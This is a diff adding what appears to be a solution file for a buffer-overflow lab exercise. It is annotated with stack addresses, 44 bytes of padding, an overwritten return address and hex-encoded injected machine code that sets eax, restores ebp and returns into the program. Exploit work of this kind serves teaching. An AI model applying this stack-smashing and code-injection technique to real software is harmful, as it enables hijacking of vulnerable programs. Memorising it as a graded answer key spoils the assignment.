@@ -1,0 +1,13 @@
+/* getbuf return address is located at address: 0x55683754 */
+/* boom() return address is located at address: 0x55683758 */
+/* Local buffer starts at address: 0x55683728 */
+/* Padding required: 44 Bytes(exclude 4 Bytes return address, and 4 Bytes argument) */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* offend code is located at 0x55683758 */
+58 37 68 55
+/* offend code */
+a1 20 c2 04 08 /* mov     0x804c220,%eax */
+bd 80 37 68 55 /* mov     $0x55683780,%ebp */
+68 81 8e 04 08 /* push    $0x8048e81 */
+c3             /* ret */
